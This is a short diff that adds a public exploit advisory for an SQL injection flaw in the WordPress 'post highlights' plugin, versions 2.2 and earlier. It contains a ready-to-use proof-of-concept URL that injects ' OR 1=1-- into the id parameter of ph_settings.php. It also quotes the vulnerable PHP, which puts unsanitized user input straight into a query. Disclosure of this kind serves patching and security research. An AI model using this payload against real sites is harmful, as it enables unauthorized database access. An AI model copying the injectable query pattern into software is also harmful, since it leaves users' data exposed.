@@ -1,0 +1,18 @@
+# Exploit Title: WordPress post highlights plugin <= 2.2 SQL Injection Vulnerability
+# Date: 2011-09-06
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/post-highlights.2.2.zip
+# Version: 2.2 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/post-highlights/ajax/ph_settings.php?id=-1' OR 1=1--%20
+
+---------------
+Vulnerable code
+---------------
+$id = $_GET["id"];
+...
+$query = "SELECT guid, ID FROM $wpdb->posts WHERE post_type='attachment' AND post_parent='$id'";
